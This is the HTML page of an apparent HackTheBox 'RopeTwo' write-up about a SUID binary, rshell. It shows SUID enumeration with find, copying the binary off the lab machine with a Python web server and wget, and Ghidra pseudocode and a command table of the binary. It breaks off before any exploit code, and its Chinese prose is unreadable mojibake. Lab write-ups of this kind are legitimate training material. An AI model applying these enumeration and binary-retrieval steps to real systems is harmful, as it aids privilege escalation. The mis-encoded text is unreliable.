<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[pwn-rshell]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell1.jpg">
<meta property="article:published_time" content="2021-02-17T19:14:09.000Z">
<meta property="article:modified_time" content="2021-02-21T15:04:39.554Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/","path":"2021/02/18/hackthebox-rope2-rshell-exploit/","title":"HackTheBox-RopeTwo-[pwn-rshell]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox-RopeTwo-[pwn-rshell] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDbinary%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">ä¸‹è½½binaryæ–‡ä»¶åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%BE%AA%E7%8E%AF"><span class="nav-number">3.</span> <span class="nav-text">ä¸»è¦å¾ªç¯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commands"><span class="nav-number">4.</span> <span class="nav-text">Commands</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">é…ç½®</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="nav-number">6.</span> <span class="nav-text">æ”¾åœ¨ä¸€èµ·</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">æ³¨é‡Š</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">å¼±ç‚¹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E5%A0%86%E4%B8%8A%E5%BE%97%E5%88%B0libc"><span class="nav-number">9.</span> <span class="nav-text">åœ¨å †ä¸Šå¾—åˆ°libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2Libc"><span class="nav-number">10.</span> <span class="nav-text">æ³„éœ²Libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C"><span class="nav-number">11.</span> <span class="nav-text">æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">12.</span> <span class="nav-text">shell</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">206</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail â†’ mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page â†’ https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube â†’ https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram â†’ https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange â†’ https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">è®°å¿†é‡Œçš„çº¯çœŸ</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">å°ç¦»</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox-RopeTwo-[pwn-rshell] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[pwn-rshell]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-18 03:14:09" itemprop="dateCreated datePublished" datetime="2021-02-18T03:14:09+08:00">2021-02-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-02-21 23:04:39" itemprop="dateModified" datetime="2021-02-21T23:04:39+08:00">2021-02-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">é€†å‘</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>9.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>36 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚</p>
<span id="more"></span>

<h2 id="ä¸‹è½½binaryæ–‡ä»¶åˆ†æ"><a href="#ä¸‹è½½binaryæ–‡ä»¶åˆ†æ" class="headerlink" title="ä¸‹è½½binaryæ–‡ä»¶åˆ†æ"></a>ä¸‹è½½binaryæ–‡ä»¶åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/rshell</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">chromeuser@rope2:~$ /usr/bin/rshell</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1000(r4j) <span class="built_in">groups</span>=1000(r4j)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">rshell: <span class="built_in">pwd</span>: <span class="built_in">command</span> not found</span><br><span class="line">$ ^C</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½rshellæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/usr/bin$ python3 -m http.server 8001</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</span><br><span class="line">10.10.14.22 - - [17/Feb/2021 19:33:30] <span class="string">&quot;GET /rshell HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># wget http://10.10.10.196:8001/rshell</span></span><br><span class="line">--2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell</span><br><span class="line">æ­£åœ¨è¿æ¥ 10.10.10.196:8001... å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK</span><br><span class="line">é•¿åº¦ï¼š14312 (14K) [application/octet-stream]</span><br><span class="line">æ­£åœ¨ä¿å­˜è‡³: â€œrshellâ€</span><br><span class="line"></span><br><span class="line">rshell                             100%[===============================================================&gt;]  13.98K  45.0KB/s  ç”¨æ—¶ 0.3s    </span><br><span class="line"></span><br><span class="line">2021-02-17 14:30:39 (45.0 KB/s) - å·²ä¿å­˜ â€œrshellâ€ [14312/14312])</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ls -la rshell</span></span><br><span class="line">-rw-r--r-- 1 root root 14312  2æœˆ 24  2020 rshell</span><br></pre></td></tr></table></figure>

<h2 id="ä¸»è¦å¾ªç¯"><a href="#ä¸»è¦å¾ªç¯" class="headerlink" title="ä¸»è¦å¾ªç¯"></a>ä¸»è¦å¾ªç¯</h2><p>ä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naGlkcmEtc3JlLm9yZy8=">Ghidra<i class="fa fa-external-link-alt"></i></span>æ‰“å¼€çœ‹äº†çœ‹ã€‚åœ¨æœç´¢å­—ç¬¦ä¸²â€œcommand not foundâ€ æ—¶ï¼Œå®šä½åœ¨0x1019beå¤„çš„å‡½æ•°ï¼Œå°†å…¶å‘½åä¸ºprocess_inputã€‚è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å‡½æ•°æ˜¯0x101b93ï¼Œå°†è°ƒç”¨main_loop</p>
<p>ä½¿ç”¨ghidraé‡å‘½åå‡½æ•°åå’Œå˜é‡åä¹‹åçš„ä¼ªä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œä¾¿äºé˜…è¯»:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void main_loop(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ssize_t i;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  byte in_buf [200];</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  init_stuff();</span><br><span class="line">  memset(in_buf,0,200);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">      i = <span class="built_in">read</span>(0,in_buf,199);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((int)i &lt; <span class="number">2</span>);</span><br><span class="line">    in_buf[(int)i + -<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    process_input(in_buf);</span><br><span class="line">  &#125; while( true );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ƒåˆå§‹åŒ–ä¸€äº›ä¸œè¥¿ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œæ‰“å°$ï¼Œè¯»å–æœ€å¤š200ä¸ªå­—ç¬¦ï¼Œnullç»“æŸè¾“å…¥ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™process_input, process_inputæ ¹æ®è¾“å…¥ä¸­çš„å‰å‡ ä¸ªå­—ç¬¦é‡‡å–è¡ŒåŠ¨:</p>
<table>
<thead>
<tr>
<th align="left">è¾“å…¥å¼€å§‹</th>
<th align="left">é‡‡å–åŠ¨ä½œ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">â€œls â€œ</td>
<td align="left">è°ƒç”¨ do_ls [0x1015cf]</td>
</tr>
<tr>
<td align="left">â€œadd â€œ</td>
<td align="left">è°ƒç”¨ do_add(user_input[4:]) [0x101345]</td>
</tr>
<tr>
<td align="left">â€œrm â€œ</td>
<td align="left">è°ƒç”¨ do_rm(user_input[3:]) [0x10166d]</td>
</tr>
<tr>
<td align="left">â€œecho â€œ</td>
<td align="left">è¾“å‡ºå­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†</td>
</tr>
<tr>
<td align="left">â€œedit â€œ</td>
<td align="left">è°ƒç”¨ do_edit(user_input[5:]) [0x1017d8]</td>
</tr>
<tr>
<td align="left">â€œwhoamiâ€</td>
<td align="left">æ‰“å° â€œr4jâ€</td>
</tr>
<tr>
<td align="left">â€œidâ€</td>
<td align="left">æ‰“å° â€œuid&#x3D;1000(r4j) gid&#x3D;1000(r4j) groups&#x3D;1000(r4j)â€</td>
</tr>
<tr>
<td align="left">å…¶å®ƒ</td>
<td align="left">æ‰“å° â€œrshell: %s: command not foundâ€</td>
</tr>
</tbody></table>
<h2 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h2><p>è¯¥ç¨‹åºä¸€æ¬¡æœ€å¤šä¿å­˜ä¸¤ä¸ªâ€œæ–‡ä»¶â€ï¼Œå…¶ä¸­file1 onæ˜¯0x104060çš„å…¨å±€æ–‡ä»¶ï¼Œfile2æ˜¯0x104130ã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œå‰8ä¸ªå­—èŠ‚åŒ…å«ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·æä¾›çš„åŒ…å«æ–‡ä»¶å†…å®¹çš„mallocåˆ›å»ºçš„å †ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚æœ‰ä¸€ç§æ£€æŸ¥åªå…è®¸å¤§å°å°äºæˆ–ç­‰äº0x70å­—èŠ‚ã€‚æœ€åä¸€ä¸ª0xC8(200)å­—èŠ‚ä¿å­˜æ–‡ä»¶çš„åç§°ã€‚addå‡½æ•°ç¡®ä¿ç¬¬äºŒä¸ªæ–‡ä»¶ä¸èƒ½ä¸ç°æœ‰æ–‡ä»¶åŒåï¼Œå¹¶ä¸”ä¸èƒ½æ·»åŠ è¶…è¿‡ä¸¤ä¸ªæ–‡ä»¶ã€‚è¿™å°†æ˜¯åˆ©ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„æœ€å¤§é™åˆ¶ï¼Œå› ä¸ºæ¯æ¬¡åªä½¿ç”¨ä¸¤ä¸ªæ–‡ä»¶å°±å¾ˆéš¾å°†å †æ“ä½œåˆ°æ‚¨æƒ³è¦çš„ä½ç½®ã€‚</p>
<p>lså‘½ä»¤åœ¨ä¸¤ä¸ªæ§½ä¸Šå¾ªç¯ï¼Œå¦‚æœæŒ‡é’ˆéç©ºï¼Œå®ƒå°†æ‰“å°æ–‡ä»¶çš„åç§°ã€‚å®ƒä¸æ‰“å°ä»»ä½•å†…å®¹ï¼Œè€Œä¸”æ— æ³•åˆæ³•åœ°è·å–æ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ºå¼€å‘æä¾›äº†å¦ä¸€ä¸ªéœ€è¦å…‹æœçš„ä¸»è¦éšœç¢ã€‚</p>
<p>rmå‘½ä»¤åœ¨ä¸¤ä¸ªæ§½ä¸Šå¾ªç¯ï¼ŒæŸ¥çœ‹åç§»é‡ä¸º8çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸è¾“å…¥åŒ¹é…ï¼Œåˆ™å°†å­—ç¬¦ä¸²æ–‡ä»¶åå…¨éƒ¨è®¾ç½®ä¸ºnullï¼Œé‡Šæ”¾åŒ…å«å†…å®¹çš„å †å†…å­˜ï¼Œå¹¶å°†æŒ‡é’ˆè®¾ç½®ä¸ºnullã€‚</p>
<p>editå‘½ä»¤æ˜¯æ¼æ´å­˜åœ¨çš„åœ°æ–¹ã€‚</p>
<p>ä½¿ç”¨ghidraå°†FUN_001017d8å‡½æ•°ä¸­å„ä¸ªå˜é‡å‘½åæˆå¦‚ä¸‹å½¢å¼ï¼Œä¾¿äºé˜…è¯»:</p>
